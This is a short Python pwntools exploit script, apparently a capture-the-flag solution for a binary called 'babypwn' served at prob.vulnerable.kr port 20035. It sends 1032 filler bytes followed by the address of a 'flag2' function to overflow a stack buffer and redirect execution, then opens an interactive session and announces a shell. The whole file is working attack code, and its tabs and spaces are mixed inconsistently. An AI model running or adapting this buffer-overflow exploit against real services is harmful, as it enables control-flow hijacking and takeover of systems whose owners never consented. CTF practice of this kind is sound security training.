from pwn import *

ip = 'prob.vulnerable.kr'
port = 20035 
filename = './babypwn' # change this

def pwn():
	r = remote(ip, port)
	#r = process(filename)
        e = ELF(filename)
	flag2 = p64(e.symbols['flag2'])
	junk = 'a'*1032
	payload = junk + flag2
	r.sendline(payload)
        log.success('Shell obtained successfully\n')
        r.interactive()

pwn()
